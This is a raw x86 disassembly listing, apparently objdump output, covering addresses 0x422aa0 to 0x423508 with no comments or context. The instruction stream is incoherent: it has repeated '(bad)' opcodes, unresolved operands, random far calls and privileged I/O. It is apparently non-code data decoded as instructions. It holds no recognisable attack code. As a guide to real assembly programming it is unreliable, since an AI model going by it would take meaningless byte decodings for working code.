  422aa0:	(bad)  
  422aa1:	and    DWORD PTR [esi],eax
  422aa3:	pop    edi
  422aa4:	sbb    bl,BYTE PTR [edi+0x5d]
  422aa7:	pop    esp
  422aa8:	idiv   DWORD PTR [edx-0x6f8ff638]
  422aae:	fwait
  422aaf:	retf   
  422ab0:	cdq    
  422ab1:	pop    edi
  422ab2:	int3   
  422ab3:	xor    BYTE PTR [eax+0x234d5a48],cl
  422ab9:	jne    0x422a71
  422abb:	mov    eax,0x9b3f1efc
  422ac0:	cmp    dh,BYTE PTR [edx]
  422ac2:	imul   edx,DWORD PTR ds:0x8fa708d4,0x58
  422ac9:	add    esi,edi
  422acb:	outs   dx,DWORD PTR ds:[esi]
  422acc:	in     al,dx
  422acd:	call   0xcab0:0x85858f5
  422ad4:	nop
  422ad5:	mov    BYTE PTR [edx+eax*1+0x44750219],dl
  422adc:	sbb    al,0xcd
  422ade:	ds inc ecx
  422ae0:	addr16 cmc 
  422ae2:	mov    DWORD PTR fs:[ecx],ebx
  422ae5:	adc    DWORD PTR [ebx-0x32421dd7],0x61e4c168
  422aef:	pop    ds
  422af0:	mov    esp,0xf0a5df83
  422af5:	fidivr DWORD PTR [ebp+0x7d631e9f]
  422afb:	fcom   QWORD PTR [edx-0x755a6b76]
  422b01:	nop
  422b02:	sub    cl,dl
  422b04:	push   ds
  422b05:	sbb    cl,cl
  422b07:	inc    eax
  422b08:	(bad)  
  422b09:	addr16 iret 
  422b0b:	sbb    eax,0x6c01713c
  422b10:	inc    ecx
  422b11:	adc    dl,dh
  422b13:	and    BYTE PTR [esi+0x6a],0x28
  422b17:	dec    ebx
  422b18:	icebp  
  422b19:	xchg   ebx,eax
  422b1a:	inc    edi
  422b1b:	and    al,0x32
  422b1d:	cmp    al,0xc7
  422b1f:	retf   
  422b20:	inc    ebp
  422b21:	es or  al,0x4f
  422b24:	sub    al,0xef
  422b26:	jns    0x422ba7
  422b28:	fcom   QWORD PTR [eax+esi*1+0x7f]
  422b2c:	mov    es,WORD PTR [ebx+0x7c6d6877]
  422b32:	fadd   QWORD PTR [ecx-0x55]
	...
  422b95:	add    BYTE PTR [edi+esi*1+0x4a],al
  422b99:	fwait
  422b9a:	jnp    0x422b9b
  422b9c:	aad    0xff
  422b9e:	push   cs
  422b9f:	adc    ebx,DWORD PTR [ecx-0x5b2598e4]
  422ba5:	popf   
  422ba6:	aas    
  422ba7:	jno    0x422baa
  422ba9:	add    BYTE PTR [edi],al
  422bab:	add    DWORD PTR [eax],eax
  422bad:	add    BYTE PTR [eax],ch
  422baf:	add    al,0xc2
  422bb1:	cli    
  422bb2:	sub    DWORD PTR [esp+ecx*4],0xffffffde
  422bb6:	call   0xf4a8c5d5
  422bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bbc:	lods   al,BYTE PTR ds:[esi]
  422bbd:	jo     0x422be2
  422bbf:	pop    ss
  422bc0:	or     DWORD PTR [esp+eiz*4+0x48],ebp
  422bc4:	cmp    ah,BYTE PTR [ebp+ecx*4-0x15691a3a]
  422bcb:	retf   0xbdf7
  422bce:	xchg   ecx,eax
  422bcf:	xchg   ebx,eax
  422bd0:	lds    ecx,FWORD PTR [ebp-0x8]
  422bd3:	js     0x422b78
  422bd5:	das    
  422bd6:	es hlt 
  422bd8:	inc    ebp
  422bd9:	dec    ebx
  422bda:	dec    eax
  422bdb:	fsubrp st(2),st
  422bdd:	stos   BYTE PTR es:[edi],al
  422bde:	push   ebp
  422bdf:	push   ss
  422be0:	inc    esp
  422be1:	mov    ah,0x4b
  422be3:	clc    
  422be4:	fld    TBYTE PTR [edi+0x7a18e46b]
  422bea:	push   ebx
  422beb:	inc    ecx
  422bec:	pop    DWORD PTR [esi]
  422bee:	xchg   edi,eax
  422bef:	or     esi,eax
  422bf1:	push   ecx
  422bf2:	popa   
  422bf3:	and    dl,BYTE PTR [ecx+0x44]
  422bf6:	xor    dh,BYTE PTR ds:0x21d815ff
  422bfc:	dec    edx
  422bfd:	xchg   esi,eax
  422bfe:	jnp    0x422b9b
  422c00:	daa    
  422c01:	es dec ebp
  422c03:	cmp    ch,BYTE PTR [eax]
  422c05:	mov    cl,BYTE PTR [edi]
  422c07:	aas    
  422c08:	call   0x642c:0x6bf7852b
  422c0f:	ror    eax,1
  422c11:	in     eax,dx
  422c12:	sbb    ebx,ebx
  422c14:	jmp    FWORD PTR fs:[ebx]
  422c17:	adc    dh,BYTE PTR [ebx+ebp*1+0x11]
  422c1b:	out    dx,al
  422c1c:	aam    0x33
  422c1e:	mov    ebp,?
  422c20:	daa    
  422c21:	sub    al,0x62
  422c23:	push   ecx
  422c24:	push   esp
  422c25:	sbb    esi,DWORD PTR [ebp+0x59519c68]
  422c2b:	in     eax,0xde
  422c2d:	jbe    0x422c1a
  422c2f:	sbb    dl,BYTE PTR [esi+0x7f]
  422c32:	and    edi,DWORD PTR [ecx-0x6dfef079]
  422c38:	call   0x1d96:0x5a9323d5
  422c3f:	stc    
  422c40:	lahf   
  422c41:	or     DWORD PTR ds:[eax],ecx
  422c44:	clc    
  422c45:	cwde   
  422c46:	dec    ebx
  422c47:	add    DWORD PTR [edi+edx*4+0x44fe9614],ecx
  422c4e:	fild   QWORD PTR [edx]
  422c50:	pop    ebx
  422c51:	iret   
  422c52:	ja     0x422c85
  422c54:	or     eax,0xdf4b2aec
  422c59:	scas   al,BYTE PTR es:[edi]
  422c5a:	jle    0x422c0d
  422c5c:	jg     0x422c5a
  422c5e:	outs   dx,BYTE PTR ds:[esi]
  422c5f:	mov    eax,ebx
  422c61:	ss mov edi,0xafae9c99
  422c67:	xor    al,0x64
  422c69:	mov    bh,0x94
  422c6b:	enter  0x2d2b,0xed
  422c6f:	dec    esp
  422c70:	js     0x422ca0
  422c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c73:	mov    bh,0xa6
  422c75:	shl    DWORD PTR [ecx],0xe4
  422c78:	add    DWORD PTR [edi+0x77fc1acd],edx
  422c7e:	pop    esp
  422c7f:	jb     0x422c79
  422c81:	(bad)  
  422c82:	out    dx,eax
  422c83:	jg     0x422cfe
  422c85:	and    eax,0xabe2b45d
  422c8a:	mov    al,ds:0x89a3ef02
  422c8f:	cmc    
  422c90:	xchg   edx,eax
  422c91:	jno    0x422cf9
  422c93:	sahf   
  422c94:	cmp    dh,dl
  422c96:	xchg   edx,eax
  422c97:	sbb    BYTE PTR [ecx-0x19],0xd2
  422c9b:	repnz xor bl,bh
  422c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c9f:	(bad)  
  422ca0:	push   ebx
  422ca1:	jmp    0x422c5a
  422ca3:	in     al,0xc1
  422ca5:	imul   eax,esp,0x66
  422ca8:	pop    esi
  422ca9:	jecxz  0x422cb5
  422cab:	mov    esp,DWORD PTR [esi+0x391dc73]
  422cb1:	call   0xcd3f92
	...
  422d16:	mov    edi,0x626d60bd
  422d1b:	std    
  422d1c:	mov    edi,0x26c593ff
  422d21:	fucomip st,st(5)
  422d23:	push   es
  422d24:	test   eax,0x172467b
  422d29:	add    BYTE PTR [edi],al
  422d2b:	add    DWORD PTR [eax],eax
  422d2d:	add    BYTE PTR [ecx-0x18],dh
  422d30:	xchg   esp,eax
  422d31:	xor    bh,BYTE PTR [ebp-0x44aaef33]
  422d37:	shl    DWORD PTR [ecx-0x35838218],1
  422d3d:	pushf  
  422d3e:	cld    
  422d3f:	stc    
  422d40:	jbe    0x422cfc
  422d42:	dec    edi
  422d43:	fiadd  WORD PTR [eax-0x10]
  422d46:	addr16 out dx,eax
  422d48:	cmc    
  422d49:	jle    0x422da6
  422d4b:	in     eax,dx
  422d4c:	jnp    0x422ce1
  422d4e:	add    eax,esi
  422d50:	ins    DWORD PTR es:[edi],dx
  422d51:	pop    esp
  422d52:	pushf  
  422d53:	out    0x2,al
  422d55:	out    0x4,eax
  422d57:	jo     0x422dba
  422d59:	xor    edx,DWORD PTR [ebx]
  422d5b:	dec    ebx
  422d5c:	(bad)  
  422d5d:	adc    DWORD PTR [ebx+0x35010221],ecx
  422d63:	(bad)  
  422d64:	jnp    0x422d02
  422d66:	cmp    ebp,esi
  422d68:	sbb    cl,BYTE PTR [esi+0xb3d7619]
  422d6e:	cld    
  422d6f:	sub    edi,DWORD PTR [ebx]
  422d71:	ror    DWORD PTR [eax],1
  422d73:	ins    BYTE PTR es:[edi],dx
  422d74:	push   ecx
  422d75:	add    eax,0x54f6d8c5
  422d7a:	jb     0x422dc7
  422d7c:	or     al,0x41
  422d7e:	call   0xbf59:0x84c0b84c
  422d85:	fwait
  422d86:	cmp    BYTE PTR [eax],cl
  422d88:	mov    bl,0xce
  422d8a:	in     al,dx
  422d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d8c:	popw   ds
  422d8e:	mov    esp,edx
  422d90:	sti    
  422d91:	dec    esi
  422d92:	sub    eax,0xe9a1ac0e
  422d97:	sbb    eax,0x61625eda
  422d9c:	dec    eax
  422d9d:	adc    al,BYTE PTR [edx+0x9a665e8]
  422da3:	fldenv ds:0x37969639
  422da9:	jo     0x422d5e
  422dab:	cmp    al,0x55
  422dad:	out    dx,al
  422dae:	cli    
  422daf:	fwait
  422db0:	xchg   ecx,eax
  422db1:	lock in eax,dx
  422db3:	(bad)  
  422db5:	pop    edx
  422db6:	dec    esp
  422db7:	rol    DWORD PTR ds:0x72166ed0,1
  422dbd:	sub    bl,ah
  422dbf:	test   al,0x13
  422dc1:	rol    DWORD PTR [edi-0x43302f8],0x99
  422dc8:	mov    esi,0xcc007544
  422dcd:	call   0xf0e9:0x45ba
  422dd3:	(bad)  
  422dd4:	cli    
  422dd5:	mov    edi,0x309bb0a1
  422dda:	fisubr WORD PTR [esi+0x199516c7]
  422de0:	(bad)  
  422de1:	in     al,0x78
  422de3:	sbb    eax,0xcccbe047
  422de8:	inc    ebp
  422de9:	xchg   DWORD PTR [ebp+0x79],edi
  422dec:	loopne 0x422df1
  422dee:	dec    ebp
  422def:	xchg   ebp,eax
  422df0:	and    esi,DWORD PTR [eax+0x2c65c8cc]
  422df6:	stos   BYTE PTR es:[edi],al
  422df7:	leave  
  422df8:	imul   ebp,DWORD PTR [ebp+0x4fe94e87],0xffffffcb
  422dff:	lods   al,BYTE PTR ds:[esi]
  422e00:	xor    eax,0xf39b2bdd
  422e05:	leave  
  422e06:	(bad)  
  422e07:	aas    
  422e08:	add    DWORD PTR [eax+0x20],esi
  422e0b:	sbb    BYTE PTR [ecx-0x115a78ea],cl
  422e11:	mov    eax,ds:0xe0c16aa2
  422e16:	push   ecx
  422e17:	xchg   ebx,eax
  422e18:	lds    edx,FWORD PTR [ebx+0x35976e8b]
  422e1e:	sti    
  422e1f:	(bad)  
  422e20:	cmp    edx,DWORD PTR [ecx+0x5b]
  422e23:	mov    ds:0xba76d4ac,al
  422e28:	and    BYTE PTR [eax+edi*2-0x3b31537f],bl
  422e2f:	jbe    0x422e70
  422e31:	sub    BYTE PTR [edx+0x4cf4],bl
	...
  422e93:	add    BYTE PTR [eax],al
  422e95:	add    BYTE PTR [ebx-0x21e677ab],al
  422e9b:	fst    QWORD PTR [ebx+0x2a9187df]
  422ea1:	mov    ebx,0x6ae76263
  422ea6:	dec    ebp
  422ea7:	jae    0x422eaa
  422ea9:	add    BYTE PTR [edi],al
  422eab:	add    DWORD PTR [eax],eax
  422ead:	add    BYTE PTR [ebx-0x6d],dh
  422eb0:	shl    DWORD PTR [eax+0x63],0xea
  422eb4:	xchg   BYTE PTR [edx],bh
  422eb6:	scas   eax,DWORD PTR es:[edi]
  422eb7:	xchg   cl,dh
  422eb9:	xchg   DWORD PTR [esi-0x6a1442c7],ecx
  422ebf:	jp     0x422e8f
  422ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ec2:	or     ah,bh
  422ec4:	xchg   esi,eax
  422ec5:	mov    eax,0x35d4c6f2
  422eca:	pop    edi
  422ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ecc:	push   cs
  422ecd:	adc    eax,0xbb2eedfa
  422ed2:	xor    bl,BYTE PTR [edi]
  422ed4:	into   
  422ed5:	or     eax,DWORD PTR [ebx+ebp*1]
  422ed8:	and    BYTE PTR [edi-0x7bd89e77],al
  422ede:	retf   
  422edf:	and    eax,0x94549e42
  422ee4:	je     0x422f42
  422ee6:	loopne 0x422f41
  422ee8:	rcl    bl,0xc7
  422eeb:	add    BYTE PTR [edi+ecx*1-0x378aaa1f],ch
  422ef2:	jl     0x422f68
  422ef4:	sbb    cl,dh
  422ef6:	mov    gs:0x6fe16be6,al
  422efc:	xchg   edx,eax
  422efd:	and    eax,0x7f24d63d
  422f02:	ficom  WORD PTR [esi-0x39ad4dd1]
  422f08:	call   0xb165:0x135b78f2
  422f0f:	adc    bh,BYTE PTR [edi-0x10c0abe1]
  422f15:	xchg   ebx,eax
  422f16:	mov    edx,0xb00734d4
  422f1b:	and    BYTE PTR [eax],ch
  422f1d:	test   al,0x26
  422f1f:	hlt    
  422f20:	data16 jae 0x422f90
  422f23:	jl     0x422f9b
  422f25:	and    ebp,edx
  422f27:	icebp  
  422f28:	leave  
  422f29:	dec    esi
  422f2a:	pop    ecx
  422f2b:	rol    BYTE PTR [esi],0xc3
  422f2e:	push   esp
  422f2f:	fs je  0x422f3e
  422f32:	sbb    al,0xc6
  422f34:	mov    ds:0x132b944c,eax
  422f39:	sbb    edi,DWORD PTR [edi]
  422f3b:	jbe    0x422f52
  422f3d:	repz ss xchg ebx,eax
  422f40:	push   ss
  422f41:	add    esp,DWORD PTR [edi+0x7fa2d32f]
  422f47:	jns    0x422ef6
  422f49:	cmp    eax,0x9a709442
  422f4e:	jl     0x422f47
  422f50:	fcom   DWORD PTR [ebx+edx*4-0x156f2bc2]
  422f57:	push   esi
  422f58:	mov    al,ds:0xe74fd1f6
  422f5d:	pusha  
  422f5e:	push   ds
  422f5f:	cmc    
  422f60:	bound  edi,QWORD PTR [edx+0x45f6f9c6]
  422f66:	repnz dec esi
  422f68:	das    
  422f69:	xchg   ebp,eax
  422f6a:	adc    ebp,0x9616644d
  422f70:	or     DWORD PTR [esi],ecx
  422f72:	test   BYTE PTR [edi-0x58],al
  422f75:	mov    eax,0x1ed03586
  422f7a:	pop    es
  422f7b:	sub    BYTE PTR [edx-0x4442fb28],0xa6
  422f82:	adc    edi,DWORD PTR [ebx+0x7f]
  422f85:	adc    ah,BYTE PTR [ecx-0xc]
  422f88:	dec    ecx
  422f89:	loope  0x422fbd
  422f8b:	cmp    bh,bh
  422f8d:	push   es
  422f8e:	xlat   BYTE PTR ds:[ebx]
  422f8f:	xor    BYTE PTR [ebx+ebp*1+0x57],al
  422f93:	dec    eax
  422f94:	xor    BYTE PTR [edi],ah
  422f96:	xchg   DWORD PTR [eax],edx
  422f98:	xor    DWORD PTR [edx],ecx
  422f9a:	xchg   ebx,eax
  422f9b:	mov    dl,0xb9
  422f9d:	jb     0x42301d
  422f9f:	sub    BYTE PTR [ebx+0x48476b8e],bl
  422fa5:	and    BYTE PTR [esi],bh
  422fa7:	jmp    0x423023
  422fa9:	test   eax,0x86767d2f
  422fae:	js     0x42302c
  422fb0:	(bad)  [eax+0x113483]
	...
  423016:	inc    esi
  423017:	in     al,0x62
  423019:	mov    dl,ah
  42301b:	mov    gs,esi
  42301d:	out    dx,al
  42301e:	lahf   
  42301f:	aaa    
  423020:	inc    ebp
  423021:	or     DWORD PTR [eax+0x5458e555],edi
  423027:	je     0x42302a
  423029:	add    BYTE PTR [edi],al
  42302b:	add    DWORD PTR [eax],eax
  42302d:	add    BYTE PTR [eax-0x51],dh
  423030:	xchg   BYTE PTR [esi-0x7e618421],dl
  423036:	aad    0xf8
  423038:	iret   
  423039:	mov    bl,0xb6
  42303b:	pusha  
  42303c:	mov    WORD PTR [ebx+0x3b8f497f],fs
  423042:	jp     0x422fff
  423044:	pop    edi
  423045:	mov    ah,0x26
  423047:	(bad)  
  423048:	jmp    0x42303f
  42304a:	in     eax,dx
  42304b:	add    eax,0x64449735
  423050:	jb     0x42300d
  423052:	js     0x42302a
  423054:	dec    ecx
  423055:	sub    al,0x71
  423057:	cld    
  423058:	sbb    BYTE PTR [edx],0xda
  42305b:	mov    ?,WORD PTR [ebx]
  42305d:	or     ah,BYTE PTR [ebp+0x3c]
  423060:	aam    0x97
  423062:	mov    al,ds:0x7cce7d
  423067:	dec    ebx
  423068:	jbe    0x423077
  42306a:	mov    ebp,0xee4d3e7e
  42306f:	pop    ss
  423070:	add    al,0x60
  423072:	fmul   DWORD PTR [ebx-0x80]
  423075:	arpl   WORD PTR [edx+0x16],ax
  423078:	and    al,0xa3
  42307a:	mov    bl,0x99
  42307c:	inc    edi
  42307d:	cld    
  42307e:	dec    esi
  42307f:	and    DWORD PTR [eax+0x49],ecx
  423082:	dec    edi
  423083:	(bad)
  423087:	xor    eax,0x2fb17837
  42308c:	aad    0x3d
  42308e:	jmp    0x42307c
  423090:	(bad)  
  423091:	in     eax,0xdc
  423093:	pop    es
  423094:	add    al,0x81
  423096:	or     eax,0x4b57ab25
  42309b:	jo     0x42305b
  42309d:	or     ebx,DWORD PTR [ebp+0x52]
  4230a0:	ret    
  4230a1:	xchg   ebx,eax
  4230a2:	fmul   DWORD PTR [edi-0x12]
  4230a5:	pop    ss
  4230a6:	fstp   QWORD PTR [edx+ecx*8-0x28]
  4230aa:	push   edx
  4230ab:	das    
  4230ac:	lods   eax,DWORD PTR ds:[esi]
  4230ad:	sub    DWORD PTR [edx],ecx
  4230af:	jno    0x423089
  4230b1:	mov    al,ds:0x87a20af7
  4230b6:	jecxz  0x423049
  4230b8:	inc    esi
  4230b9:	repnz jecxz 0x423077
  4230bc:	or     al,0x4b
  4230be:	lods   eax,DWORD PTR ds:[esi]
  4230bf:	int3   
  4230c0:	dec    eax
  4230c1:	mov    edx,0x45b73298
  4230c6:	adc    DWORD PTR [edx],0x52
  4230c9:	xchg   ecx,eax
  4230ca:	inc    ebp
  4230cb:	mov    ebx,0xb2b5238e
  4230d0:	mov    al,0x1d
  4230d2:	test   eax,0x98336606
  4230d7:	pushf  
  4230d8:	and    DWORD PTR [ebx-0x7d],ecx
  4230db:	inc    ebx
  4230dc:	div    BYTE PTR [ebx]
  4230de:	jb     0x42315d
  4230e0:	popa   
  4230e1:	dec    eax
  4230e2:	mov    esi,0x34d58c72
  4230e7:	jl     0x423125
  4230e9:	shl    BYTE PTR ds:0x13be06b0,cl
  4230ef:	nop
  4230f0:	es jo  0x4230df
  4230f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230f4:	int3   
  4230f5:	ja     0x42312b
  4230f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230f8:	cmp    BYTE PTR ss:[eax-0x11199c8f],bl
  4230ff:	pushf  
  423100:	push   ebp
  423101:	int    0x67
  423103:	sub    al,0xcb
  423105:	mov    ch,BYTE PTR [edx+0x30]
  423108:	pcmpeqw mm2,QWORD PTR cs:[edx-0x25fd91c8]
  423110:	and    al,0xff
  423112:	adc    BYTE PTR [ebx+eiz*8+0x70af865b],dh
  423119:	loop   0x4230b4
  42311b:	jne    0x423155
  42311d:	and    DWORD PTR [edi+0x21f747b7],eax
  423123:	or     dh,bl
  423125:	cmp    eax,0xca9eb96
  42312a:	test   eax,0xbd0c3272
  42312f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423130:	push   esp
  423131:	fstp   QWORD PTR [ebp-0x2f]
  423134:	jg     0x423136
	...
  423196:	jns    0x423189
  423198:	div    DWORD PTR [ecx-0x6804801]
  42319e:	dec    edi
  42319f:	jno    0x423168
  4231a1:	or     BYTE PTR [ebp+edx*1-0x26],0x27
  4231a6:	pop    ebx
  4231a7:	jne    0x4231aa
  4231a9:	add    BYTE PTR [edi],al
  4231ab:	add    DWORD PTR [eax],eax
  4231ad:	add    BYTE PTR [edx],al
  4231af:	imul   esi,DWORD PTR [ebp-0x31],0x3293e7d
  4231b6:	lock imul edi,DWORD PTR [esp+eax*2+0x628773ec],0x7fafe7f8
  4231c2:	push   eax
  4231c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231c4:	and    BYTE PTR [edx+0x35],cl
  4231c7:	clc    
  4231c8:	cmp    ebp,DWORD PTR [esi-0x4b]
  4231cb:	adc    bl,0x95
  4231ce:	lea    esp,[eax+0x33]
  4231d1:	jecxz  0x4231d5
  4231d3:	xchg   edi,eax
  4231d4:	push   esp
  4231d5:	stos   BYTE PTR es:[edi],al
  4231d6:	push   ebx
  4231d7:	add    ah,dl
  4231d9:	imul   ebx,DWORD PTR ds:0x83f1c0fb,0xcd0c5120
  4231e3:	test   DWORD PTR [edi+0x13b2d540],edx
  4231e9:	mov    ds:0x52cdf8b6,eax
  4231ee:	inc    edx
  4231ef:	dec    esi
  4231f0:	pop    eax
  4231f1:	push   edi
  4231f2:	out    dx,eax
  4231f3:	fmul   DWORD PTR [esi-0x4fbfc27]
  4231f9:	mov    edx,DWORD PTR [ebx+edi*8]
  4231fc:	cmp    cl,bh
  4231fe:	fisttp QWORD PTR [ebp-0x4e8cf434]
  423204:	(bad)  
  423205:	aas    
  423206:	mov    al,0xaa
  423208:	or     al,0x2c
  42320a:	in     eax,dx
  42320b:	cdq    
  42320c:	xchg   DWORD PTR [edx+0x16],ecx
  42320f:	push   ebp
  423210:	push   esi
  423211:	pop    ebx
  423212:	test   eax,0x988c10e6
  423217:	into   
  423218:	into   
  423219:	sbb    DWORD PTR [edi-0x3c],edi
  42321c:	mov    bl,al
  42321e:	pop    edi
  42321f:	sbb    eax,0xfe3abeb4
  423224:	jns    0x4231fe
  423226:	ret    
  423227:	dec    eax
  423228:	lar    esp,WORD PTR ds:0x1795f331
  42322f:	int3   
  423230:	jge    0x423219
  423232:	cmp    dh,bh
  423234:	jo     0x4232b2
  423236:	sub    BYTE PTR [eax+0x108c46dc],bh
  42323c:	in     al,dx
  42323d:	into   
  42323e:	inc    esi
  42323f:	pop    ecx
  423240:	cwde   
  423241:	daa    
  423242:	(bad)  
  423243:	arpl   WORD PTR [ecx],bx
  423245:	pushf  
  423246:	in     al,dx
  423247:	mov    WORD PTR [esi],es
  423249:	dec    eax
  42324a:	pop    ebx
  42324b:	imul   edi,ebx,0xce60c7b0
  423251:	mov    ebx,DWORD PTR [ecx+0x5]
  423254:	ret    0x5dd
  423257:	pop    edx
  423258:	int3   
  423259:	cmp    bl,dl
  42325b:	div    BYTE PTR [edi+0x57]
  42325e:	push   cs
  42325f:	mov    al,ds:0x4845eed5
  423264:	xchg   edi,eax
  423265:	jmp    0x5ac1:0x2ec01c06
  42326c:	je     0x4232db
  42326e:	push   ss
  42326f:	pop    ebx
  423270:	(bad)  
  423271:	xor    eax,esp
  423273:	add    eax,0xc3358576
  423278:	push   esp
  423279:	scas   al,BYTE PTR es:[edi]
  42327a:	in     al,0xd8
  42327c:	or     eax,0x547d12d4
  423281:	mov    ?,edi
  423283:	mov    DWORD PTR [edx+0x4573619],esi
  423289:	je     0x42328b
  42328b:	out    0x51,al
  42328d:	mov    ebx,DWORD PTR [edx+0x7f2357a6]
  423293:	arpl   WORD PTR [eax],bp
  423295:	jl     0x423276
  423297:	rcr    BYTE PTR [ebx+0x3d],0x26
  42329b:	(bad)  
  42329c:	mov    dh,0x33
  42329e:	jnp    0x4232b6
  4232a0:	retf   
  4232a1:	out    dx,al
  4232a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232a3:	imul   esi,DWORD PTR [esi+edx*8-0x35f2cc],0xf60c3fd0
  4232ae:	popa   
  4232af:	ficomp DWORD PTR [ebx-0x24de995b]
	...
  423315:	add    al,bh
  423317:	fisub  WORD PTR [edx+0x30]
  42331a:	mov    sp,0xdefa
  42331e:	xchg   edi,eax
  42331f:	inc    esp
  423320:	lock (bad) 
  423322:	retf   0x8d48
  423325:	fsub   DWORD PTR [edx+0x76]
  423328:	add    DWORD PTR [eax],eax
  42332a:	pop    es
  42332b:	add    DWORD PTR [eax],eax
  42332d:	add    BYTE PTR [ecx-0x77],ch
  423330:	addr16 imul esi,edi,0xffffffd1
  423334:	jb     0x4232f2
  423336:	(bad)  
  423337:	iret   
  423338:	xor    DWORD PTR [edi+edx*4-0x31],ecx
  42333c:	dec    edi
  42333d:	push   edi
  42333e:	inc    eax
  42333f:	mov    dl,0xf3
  423341:	adc    al,0xb2
  423343:	xlat   BYTE PTR ds:[ebx]
  423344:	(bad)  
  423345:	sbb    BYTE PTR [ebx-0x2eaeea11],bl
  42334b:	jno    0x4232e7
  42334d:	push   ebp
  42334e:	(bad)  
  42334f:	and    DWORD PTR [edi+0x7d292082],edx
  423355:	fnstenv [edx-0x6c]
  423358:	cld    
  423359:	ins    BYTE PTR es:[edi],dx
  42335a:	jmp    0x423373
  42335c:	ins    DWORD PTR es:[edi],dx
  42335d:	nop
  42335e:	pusha  
  42335f:	xor    cl,0x8
  423362:	pop    eax
  423363:	sahf   
  423364:	cdq    
  423365:	int3   
  423366:	push   esi
  423367:	outs   dx,BYTE PTR ds:[esi]
  423368:	sub    al,0x22
  42336a:	dec    edi
  42336b:	es pusha 
  42336d:	sub    ch,al
  42336f:	push   esp
  423370:	cmp    al,0xc4
  423372:	push   edx
  423373:	fidiv  DWORD PTR [esi+0x6134cb07]
  423379:	mov    WORD PTR [ebx+ebp*4+0x1534e61c],cs
  423380:	icebp  
  423381:	jbe    0x4233f3
  423383:	(bad)  
  423384:	xchg   ebx,eax
  423385:	sub    eax,esp
  423387:	mov    dl,0x29
  423389:	ror    BYTE PTR [edi],cl
  42338b:	arpl   WORD PTR ds:0x1495e49a,di
  423391:	mov    ch,0xf5
  423393:	jnp    0x423386
  423395:	mov    al,ds:0xa8a86463
  42339a:	les    edi,FWORD PTR [ebx+0x58]
  42339d:	mov    ebx,0x917a5804
  4233a2:	inc    esp
  4233a3:	push   es
  4233a4:	iret   
  4233a5:	sub    ah,dh
  4233a7:	mov    ds:0xc9339020,al
  4233ac:	jne    0x4233d4
  4233ae:	sub    eax,0x41268c9f
  4233b3:	mov    BYTE PTR [eax+0x74],0x36
  4233b7:	sub    ecx,edx
  4233b9:	pushw  0xff8f
  4233bc:	fstp   TBYTE PTR [esi]
  4233be:	fist   DWORD PTR [ebx+0x29]
  4233c1:	xchg   esi,eax
  4233c2:	cli    
  4233c3:	pop    edi
  4233c4:	sbb    al,0x9f
  4233c6:	sub    al,0x95
  4233c8:	dec    cx
  4233ca:	jecxz  0x423361
  4233cc:	test   al,0xc
  4233ce:	ds nop
  4233d0:	imul   DWORD PTR [ebx-0x15b02995]
  4233d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233d7:	adc    eax,0xc19861a2
  4233dc:	out    0xa3,al
  4233de:	arpl   bp,sp
  4233e0:	push   edi
  4233e1:	inc    ecx
  4233e2:	or     al,0x90
  4233e4:	mov    dl,0x47
  4233e6:	cmp    esi,DWORD PTR [edi-0x3eb191b6]
  4233ec:	jmp    0xd9fb:0xe286c82f
  4233f3:	mov    cl,0xb2
  4233f5:	mov    BYTE PTR [ecx+eiz*8],dl
  4233f8:	aad    0x2a
  4233fa:	push   0xffffff90
  4233fc:	push   ebx
  4233fd:	divps  xmm1,XMMWORD PTR [ebx+eiz*4]
  423401:	pop    esi
  423402:	outs   dx,BYTE PTR ds:[esi]
  423403:	bound  edi,QWORD PTR ds:0x67c1ad14
  423409:	cmp    BYTE PTR [esi+0x7a],bh
  42340c:	lea    esp,es:[ecx-0x37872ecd]
  423413:	sbb    BYTE PTR [edx+0x6f9bc4b1],dh
  423419:	fdiv   st,st(7)
  42341b:	add    BYTE PTR [edi+0x36],0xc9
  42341f:	mov    edi,0x92e561da
  423424:	(bad)  
  423425:	outs   dx,DWORD PTR ds:[esi]
  423426:	lea    esi,[ecx]
  423428:	jg     0x4233fc
  42342a:	cmp    al,0x5f
  42342c:	pop    esi
  42342d:	xlat   BYTE PTR ds:[ebx]
  42342e:	into   
  42342f:	xchg   esi,eax
  423430:	imul   eax,edx,0xe47670
	...
  423496:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42349d:	mov    edi,0xe016fb60
  4234a2:	ss mov dh,0x25
  4234a5:	add    al,0x69
  4234a7:	ja     0x4234aa
  4234a9:	add    BYTE PTR [edi],al
  4234ab:	add    DWORD PTR [eax],eax
  4234ad:	add    BYTE PTR [eax-0x66],ch
  4234b0:	sbb    eax,0x865b642c
  4234b5:	or     ax,0x2e31
  4234b9:	pop    es
  4234ba:	loope  0x423476
  4234bc:	pminub mm0,QWORD PTR es:[esi]
  4234c0:	dec    ecx
  4234c1:	sbb    esi,DWORD PTR [eax+0x26d2dce4]
  4234c7:	pop    edx
  4234c8:	rol    DWORD PTR [ebp+0x436105c8],1
  4234ce:	ins    DWORD PTR es:[edi],dx
  4234cf:	inc    ecx
  4234d0:	ja     0x423487
  4234d2:	scas   al,BYTE PTR es:[di]
  4234d4:	mov    esi,0x936a5a2c
  4234d9:	stc    
  4234da:	scas   al,BYTE PTR es:[edi]
  4234db:	in     al,dx
  4234dc:	pop    DWORD PTR [ebx-0x4d]
  4234df:	retf   0x7af
  4234e2:	and    dh,bl
  4234e4:	outs   dx,DWORD PTR ds:[esi]
  4234e5:	cmp    al,bl
  4234e7:	test   BYTE PTR ds:0xda7f7769,dh
  4234ed:	out    0x2f,al
  4234ef:	or     al,0x22
  4234f1:	mov    bl,0x34
  4234f3:	adc    eax,0x81909edb
  4234f8:	xchg   ebx,eax
  4234f9:	jg     0x423529
  4234fb:	call   0x4a85:0x158b96b3
  423502:	inc    bh
  423504:	jecxz  0x423575
  423506:	cmp    esp,ecx
  423508:	mov    ecx,0xf285514
